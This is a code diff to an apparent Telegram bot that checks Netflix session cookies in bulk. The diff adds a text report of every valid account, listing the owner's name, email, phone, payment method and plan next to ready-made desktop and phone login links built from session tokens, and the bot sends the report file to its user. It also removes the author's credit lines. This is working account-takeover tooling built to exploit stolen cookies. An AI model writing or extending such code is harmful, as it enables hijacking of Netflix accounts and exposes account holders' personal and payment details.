@@ -325,6 +325,42 @@ def _safe_preview_cookie_keys(cookie_header: str) -> str:
     names = [n for n in names if n]
     return ", ".join(names[:8]) + ("…" if len(names) > 8 else "")
 
+def _generate_results_txt(valid_accounts: list, filename: str) -> str:
+    """Generates a formatted summary report text file of all checked valid accounts including login links."""
+    lines = []
+    lines.append("==================================================")
+    lines.append(f" NETFLIX COOKIE CHECKER REPORT - {filename}")
+    lines.append(f" Generated At: {time.strftime('%Y-%m-%d %H:%M:%S')}")
+    lines.append(f" Total Valid Accounts Found: {len(valid_accounts)}")
+    lines.append("==================================================\n")
+
+    for idx, acct in enumerate(valid_accounts, start=1):
+        nftoken = acct.get('nftoken', '')
+        desktop_link = f"https://www.netflix.com/browse?nftoken={nftoken}" if nftoken else "N/A"
+        phone_link = f"https://www.netflix.com/unsupported?nftoken={nftoken}" if nftoken else "N/A"
+
+        lines.append(f"--- ACCOUNT #{idx} [{acct.get('source_tag', 'Cookie')}] ---")
+        lines.append(f"Name           : {acct.get('name', 'Unknown')}")
+        lines.append(f"Email          : {acct.get('email', 'Unknown')}")
+        lines.append(f"Country        : {acct.get('country', 'Unknown')}")
+        lines.append(f"Plan           : {acct.get('plan', 'Unknown')}")
+        lines.append(f"Price          : {acct.get('plan_price', 'N/A')}")
+        lines.append(f"Member Since   : {acct.get('member_since', 'Unknown')}")
+        lines.append(f"Next Billing   : {acct.get('next_billing', 'Unknown')}")
+        lines.append(f"Payment Method : {acct.get('payment_method', 'CC')}")
+        lines.append(f"Payment Status : {acct.get('payment_status', 'Active / Paid')}")
+        lines.append(f"Phone Number   : {acct.get('phone', 'N/A')} (Has Phone: {acct.get('has_phone', 'No')})")
+        lines.append(f"Video Quality  : {acct.get('video_quality', 'HD')}")
+        lines.append(f"Max Streams    : {acct.get('max_streams', '2')}")
+        lines.append(f"Extra Member   : {acct.get('extra_member', 'No')}")
+        lines.append(f"Email Verified : {acct.get('email_verified', 'No')}")
+        lines.append(f"Profiles       : {acct.get('profiles', 'Unknown')}")
+        lines.append(f"💻 Desktop Link : {desktop_link}")
+        lines.append(f"📱 Phone Link   : {phone_link}")
+        lines.append("--------------------------------------------------\n")
+
+    return "\n".join(lines)
+
 
 # ========== NETFLIX API & VERIFICATION ==========
 NFTOKEN_API_URL = "https://ios.prod.ftl.netflix.com/iosui/user/15.48"
@@ -807,8 +843,7 @@ async def handle_cookie_text(update: Update, context: ContextTypes.DEFAULT_TYPE)
                 f"• Email Verified: {acct.get('email_verified', 'No')}\n"
                 f"• Membership Status: {acct.get('membership_status', 'CURRENT_MEMBER')}\n"
                 f"• Connected Profiles: {acct.get('connected_profiles', '1')}\n"
-                f"• Profiles: {acct.get('profiles', 'Unknown')}\n\n"
-                "🦖 Checked by @zyokr"
+                f"• Profiles: {acct.get('profiles', 'Unknown')}"
             )
 
             keyboard = [
@@ -894,6 +929,7 @@ async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
         total_cookies = len(cookie_queue)
         valid_count = 0
         dead_count = 0
+        valid_accounts_list = []  # Store valid account details for .txt report
         last_update_time = time.time()
 
         await status_msg.edit_text(
@@ -946,7 +982,9 @@ async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
                 if ok and nftoken:
                     acct = await loop.run_in_executor(None, _check_netflix_cookie, cookie_header)
-                    
+                    acct["source_tag"] = display_name
+                    acct["nftoken"] = nftoken  # Store nftoken for report links
+
                     if cancel_bulk_event.is_set():
                         logger.info("Bulk check cancelled post-account-check via /stop")
                         break
@@ -975,8 +1013,7 @@ async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
                         f"• Email Verified: {acct.get('email_verified', 'No')}\n"
                         f"• Membership Status: {acct.get('membership_status', 'CURRENT_MEMBER')}\n"
                         f"• Connected Profiles: {acct.get('connected_profiles', '1')}\n"
-                        f"• Profiles: {acct.get('profiles', 'Unknown')}\n\n"
-                        "🦖 Bot by @zyokr"
+                        f"• Profiles: {acct.get('profiles', 'Unknown')}"
                     )
 
                     keyboard = [
@@ -993,12 +1030,14 @@ async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
                         disable_web_page_preview=True
                     )
                     valid_count += 1
+                    valid_accounts_list.append(acct)
                 else:
                     dead_count += 1
             except Exception as e:
                 logger.error(f"Error checking {display_name}: {e}")
                 dead_count += 1
 
+        # Final Status Editing & Exporting TXT Report
         if cancel_bulk_event.is_set():
             await status_msg.edit_text(
                 f"🛑 **Bulk Check Stopped Manually!**\n\n"
@@ -1015,6 +1054,23 @@ async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 f"🔴 Dead / Invalid: {dead_count}",
                 parse_mode="Markdown"
             )
+
+        # Send TXT file export if valid accounts were found
+        if valid_accounts_list:
+            report_filename = f"results_{os.path.splitext(filename)[0]}.txt"
+            report_path = os.path.join(temp_dir, report_filename)
+            report_content = _generate_results_txt(valid_accounts_list, filename)
+            
+            with open(report_path, "w", encoding="utf-8") as rf:
+                rf.write(report_content)
+                
+            with open(report_path, "rb") as doc_file:
+                await update.message.reply_document(
+                    document=doc_file,
+                    filename=report_filename,
+                    caption=f"📄 **Results Summary Export**\nFound {len(valid_accounts_list)} valid account(s).",
+                    parse_mode="Markdown"
+                )
 
     except Exception as e:
         logger.error(f"Error handling document: {e}")
